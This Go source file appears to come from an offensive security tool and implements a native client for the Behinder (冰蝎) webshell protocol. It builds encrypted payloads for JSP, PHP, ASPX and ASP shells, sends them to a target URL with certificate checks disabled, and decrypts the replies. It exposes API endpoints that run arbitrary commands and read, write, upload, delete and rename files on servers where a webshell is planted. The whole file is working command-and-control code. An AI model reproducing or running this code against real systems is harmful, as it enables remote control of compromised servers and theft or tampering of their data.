package handler

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
)

// BehinderHandler implements the Behinder (冰蝎) webshell protocol natively in Go.
type BehinderHandler struct {
	logger   *zap.Logger
	client   *http.Client
	classDir string // Directory containing Cmd.class and FileOperation.class (JSP only)
}

// NewBehinderHandler creates a Behinder protocol handler.
func NewBehinderHandler(logger *zap.Logger) *BehinderHandler {
	return &BehinderHandler{
		logger: logger,
		client: &http.Client{
			Timeout: 60 * time.Second,
			Transport: &http.Transport{
				DisableKeepAlives: false,
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
			},
		},
		classDir: "/opt/CyberStrikeAI/tools/behinder/net/rebeyond/behinder/payload/java",
	}
}

// normalizeShellType maps common type names to behinder_crypto.go's shell types.
func normalizeShellType(t string) string {
	t = strings.ToLower(strings.TrimSpace(t))
	switch t {
	case "jsp", "php", "asp", "aspx":
		return t
	case "java":
		return "jsp"
	default:
		return "jsp" // default to JSP for unknown types
	}
}

// ---------------------------------------------------------------------------
// Core protocol operations
// ---------------------------------------------------------------------------

// buildPayload builds an encrypted, Base64-encoded payload for the target shell.
// For JSP shells, it modifies Java class bytecode. For other types, it uses
// plain text commands (Behinder "func|args" format).
func (h *BehinderHandler) buildPayload(shellType, className string, fields map[string]string, password string) ([]byte, error) {
	st := normalizeShellType(shellType)
	proto := NewBehinderProtocol(password, st)

	switch st {
	case "jsp":
		// JSP: modify class bytecode, encrypt, Base64 encode
		classPath := filepath.Join(h.classDir, className+".class")
		classBytes, err := os.ReadFile(classPath)
		if err != nil {
			return nil, fmt.Errorf("read %s.class: %w", className, err)
		}
		modified, err := modifyClassFields(classBytes, fields)
		if err != nil {
			return nil, fmt.Errorf("modify %s.class: %w", className, err)
		}
		encrypted, err := proto.Encrypt(modified)
		if err != nil {
			return nil, fmt.Errorf("encrypt payload: %w", err)
		}
		b64 := base64.StdEncoding.EncodeToString(encrypted)
		return []byte(b64), nil

	default:
		// PHP / ASPX / ASP: plain text command format
		// Build the command string from fields
		var cmd string
		if c, ok := fields["cmd"]; ok {
			cmd = c
		} else if m, ok := fields["mode"]; ok {
			p := fields["path"]
			switch m {
			case "list", "show", "delete", "createDirectory":
				cmd = m + "|" + p
			case "create":
				cmd = m + "|" + p + "|" + fields["content"]
			case "rename":
				cmd = m + "|" + p + "|" + fields["newPath"]
			default:
				cmd = m + "|" + p
			}
		}
		encrypted, err := proto.Encrypt([]byte(cmd))
		if err != nil {
			return nil, fmt.Errorf("encrypt payload: %w", err)
		}
		// proto.Encrypt for PHP already returns Base64; for ASPX returns raw
		if st == "php" {
			return encrypted, nil // already Base64 from Encrypt
		}
		if st == "aspx" {
			return encrypted, nil // raw bytes for ASPX
		}
		// ASP (XOR): Base64 encode
		b64 := base64.StdEncoding.EncodeToString(encrypted)
		return []byte(b64), nil
	}
}

// sendPayload POSTs the payload to the target URL and returns the raw response body.
// Performs an initial GET to obtain session cookies (required by some Behinder shells).
func (h *BehinderHandler) sendPayload(url string, payload []byte, headerText string) ([]byte, error) {
	// Get session cookies first
	sessionReq, err := http.NewRequest(http.MethodGet, url, nil)
	if err == nil {
		applyWebshellHeaderText(sessionReq, headerText)
	}
	var sessionResp *http.Response
	if err == nil {
		sessionResp, err = h.client.Do(sessionReq)
	}
	if err == nil {
		sessionResp.Body.Close()
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(payload))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	applyWebshellHeaderText(req, headerText)

	// Forward session cookies if obtained
	if sessionResp != nil {
		for _, cookie := range sessionResp.Cookies() {
			req.AddCookie(cookie)
		}
	}

	resp, err := h.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("POST %s: %w", url, err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	h.logger.Debug("Behinder response",
		zap.Int("status", resp.StatusCode),
		zap.Int("body_len", len(body)),
		zap.String("body_preview", truncateForLog(string(body), 200)),
	)
	return body, nil
}

// parseResponse decrypts and extracts the result from a Behinder shell response.
// JSP shells vary in the wild: some return raw AES bytes, some return Base64 text,
// and either form may or may not append Behinder magic bytes. Try all sane forms.
// PHP: response is Base64(AES-CBC(result)) → Decrypt handles Base64+CBC internally.
// ASPX: response is raw AES-CBC → Decrypt handles CBC directly.
func (h *BehinderHandler) parseResponse(respBody []byte, password, shellType string) (string, error) {
	if len(respBody) == 0 {
		return "", nil
	}

	st := normalizeShellType(shellType)
	proto := NewBehinderProtocol(password, st)

	var decrypted []byte
	var err error
	if st == "jsp" {
		decrypted, err = decryptBehinderJSPResponse(proto, respBody)
	} else {
		decrypted, err = proto.Decrypt(respBody)
	}
	if err != nil {
		preview := truncateForLog(string(respBody), 200)
		return "", fmt.Errorf("decrypt failed (type=%s, len=%d): %w | body: %s",
			st, len(respBody), err, preview)
	}

	return parseBehinderJSONMessage(decrypted), nil
}

func decryptBehinderJSPResponse(proto *BehinderProtocol, respBody []byte) ([]byte, error) {
	type candidate struct {
		name string
		body []byte
	}

	trimmed := bytes.TrimSpace(respBody)
	candidates := []candidate{{name: "raw", body: respBody}}
	if !bytes.Equal(trimmed, respBody) {
		candidates = append([]candidate{{name: "trimmed_raw", body: trimmed}}, candidates...)
	}
	if decoded, err := base64.StdEncoding.DecodeString(string(trimmed)); err == nil {
		candidates = append([]candidate{{name: "base64", body: decoded}}, candidates...)
	}

	magicNum := proto.getMagicNum()
	var firstPlain []byte
	var firstErr error
	for _, c := range candidates {
		variants := []candidate{{name: c.name, body: c.body}}
		if magicNum > 0 && len(c.body) > magicNum {
			variants = append(variants, candidate{name: c.name + "_without_magic", body: c.body[:len(c.body)-magicNum]})
		}
		for _, v := range variants {
			if len(v.body) == 0 || len(v.body)%aesBlockSize != 0 {
				continue
			}
			plain, err := proto.decryptECB(v.body)
			if err != nil {
				if firstErr == nil {
					firstErr = fmt.Errorf("%s: %w", v.name, err)
				}
				continue
			}
			if firstPlain == nil {
				firstPlain = plain
			}
			if json.Valid(plain) {
				return plain, nil
			}
		}
	}
	if firstPlain != nil {
		return firstPlain, nil
	}
	if firstErr != nil {
		return nil, firstErr
	}
	return nil, fmt.Errorf("no jsp response candidate matched AES block size")
}

func parseBehinderJSONMessage(decrypted []byte) string {
	var result map[string]interface{}
	if err := json.Unmarshal(decrypted, &result); err != nil {
		return string(decrypted)
	}
	if msg, ok := result["msg"].(string); ok {
		if decoded, err := base64.StdEncoding.DecodeString(msg); err == nil {
			return string(decoded)
		}
		return msg
	}
	return string(decrypted)
}

const aesBlockSize = 16

// execute is the unified command execution flow.
func (h *BehinderHandler) execute(url, password, shellType, command, headerText string) (string, error) {
	payload, err := h.buildPayload(shellType, "Cmd", map[string]string{"cmd": command, "path": ""}, password)
	if err != nil {
		return "", err
	}
	respBody, err := h.sendPayload(url, payload, headerText)
	if err != nil {
		return "", err
	}
	return h.parseResponse(respBody, password, shellType)
}

// fileOp is the unified file operation flow.
func (h *BehinderHandler) fileOp(url, password, shellType string, fields map[string]string, headerText string) (string, error) {
	payload, err := h.buildPayload(shellType, "FileOperation", fields, password)
	if err != nil {
		return "", err
	}
	respBody, err := h.sendPayload(url, payload, headerText)
	if err != nil {
		return "", err
	}
	return h.parseResponse(respBody, password, shellType)
}

// ---------------------------------------------------------------------------
// Request / Response types
// ---------------------------------------------------------------------------

type BehinderExecRequest struct {
	URL      string `json:"url" binding:"required"`
	Password string `json:"password"`
	Type     string `json:"type"`
	Command  string `json:"command" binding:"required"`
}

type BehinderExecResponse struct {
	OK     bool   `json:"ok"`
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

// ExecWithParams executes a command on a Behinder webshell.
func (h *BehinderHandler) ExecWithParams(url, password, shellType, command string) (string, bool, string) {
	return h.ExecWithParamsHeaders(url, password, shellType, command, "")
}

// ExecWithParamsHeaders executes a command with caller-supplied raw HTTP headers.
func (h *BehinderHandler) ExecWithParamsHeaders(url, password, shellType, command, headerText string) (string, bool, string) {
	url = strings.TrimSpace(url)
	command = strings.TrimSpace(command)
	if url == "" || command == "" {
		return "", false, "url and command are required"
	}
	if password == "" {
		password = "rebeyond"
	}

	st := normalizeShellType(shellType)
	h.logger.Info("Behinder exec",
		zap.String("url", url),
		zap.String("shell_type", st),
		zap.String("command", truncateForLog(command, 100)),
	)

	output, err := h.execute(url, password, st, command, headerText)
	if err != nil {
		h.logger.Warn("Behinder exec failed", zap.Error(err))
		return "", false, err.Error()
	}
	return output, true, ""
}

// buildBehinderFileFields maps CyberStrikeAI file actions to Behinder FileOperation fields.
func buildBehinderFileFields(action, path, content, targetPath string, chunkIndex int) (map[string]string, error) {
	action = strings.ToLower(strings.TrimSpace(action))
	fields := map[string]string{"path": path}

	switch action {
	case "list":
		fields["mode"] = "list"
	case "read":
		fields["mode"] = "show"
	case "write":
		fields["mode"] = "create"
		fields["content"] = base64.StdEncoding.EncodeToString([]byte(content))
	case "upload":
		fields["mode"] = "create"
		fields["content"] = content
	case "upload_chunk":
		if chunkIndex == 0 {
			fields["mode"] = "create"
		} else {
			fields["mode"] = "append"
		}
		fields["content"] = content
	case "delete":
		fields["mode"] = "delete"
	case "mkdir":
		fields["mode"] = "createDirectory"
	case "rename":
		if strings.TrimSpace(targetPath) == "" {
			return nil, fmt.Errorf("target_path is required for rename")
		}
		fields["mode"] = "rename"
		fields["newPath"] = targetPath
	default:
		return nil, fmt.Errorf("unsupported action: %s (supported: list, read, write, upload, upload_chunk, delete, mkdir, rename)", action)
	}
	return fields, nil
}

// FileOpWithParams performs a file operation on a Behinder webshell.
// Supported actions: list, read, write, upload, upload_chunk, delete, mkdir, rename.
func (h *BehinderHandler) FileOpWithParams(url, password, shellType, action, path, content, targetPath string, chunkIndex int) (string, bool, string) {
	return h.FileOpWithParamsHeaders(url, password, shellType, action, path, content, targetPath, chunkIndex, "")
}

// FileOpWithParamsHeaders performs a file operation with caller-supplied raw HTTP headers.
func (h *BehinderHandler) FileOpWithParamsHeaders(url, password, shellType, action, path, content, targetPath string, chunkIndex int, headerText string) (string, bool, string) {
	url = strings.TrimSpace(url)
	action = strings.ToLower(strings.TrimSpace(action))
	if url == "" || action == "" {
		return "", false, "url and action are required"
	}
	if password == "" {
		password = "rebeyond"
	}

	st := normalizeShellType(shellType)
	h.logger.Info("Behinder FileOp",
		zap.String("url", url),
		zap.String("shell_type", st),
		zap.String("action", action),
		zap.String("path", truncateForLog(path, 200)),
	)

	fields, fieldErr := buildBehinderFileFields(action, path, content, targetPath, chunkIndex)
	if fieldErr != nil {
		return "", false, fieldErr.Error()
	}

	output, err := h.fileOp(url, password, st, fields, headerText)
	if err != nil {
		h.logger.Warn("Behinder FileOp failed", zap.Error(err))
		return "", false, err.Error()
	}
	return decodeBehinderFileOutput(action, output), true, ""
}

func decodeBehinderFileOutput(action, output string) string {
	if strings.ToLower(strings.TrimSpace(action)) != "read" {
		return output
	}
	decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(output))
	if err != nil {
		return output
	}
	return string(decoded)
}

// Exec handles POST /api/behinder/exec (standalone endpoint).
func (h *BehinderHandler) Exec(c *gin.Context) {
	var req BehinderExecRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	output, ok, errMsg := h.ExecWithParams(req.URL, req.Password, req.Type, req.Command)
	if !ok {
		c.JSON(http.StatusOK, BehinderExecResponse{OK: false, Error: errMsg})
		return
	}
	c.JSON(http.StatusOK, BehinderExecResponse{OK: true, Output: output})
}

// TestConnection tests connectivity to a Behinder webshell.
func (h *BehinderHandler) TestConnection(c *gin.Context) {
	var req struct {
		URL      string `json:"url" binding:"required"`
		Password string `json:"password"`
		Type     string `json:"type"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Password == "" {
		req.Password = "rebeyond"
	}

	st := normalizeShellType(req.Type)
	h.logger.Info("Behinder test connection",
		zap.String("url", req.URL),
		zap.String("shell_type", st),
	)

	output, err := h.execute(req.URL, req.Password, st, "echo 1", "")
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"ok": false, "error": err.Error()})
		return
	}

	ok := strings.TrimSpace(output) == "1"
	c.JSON(http.StatusOK, gin.H{
		"ok":     ok,
		"output": output,
	})
}

func truncateForLog(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
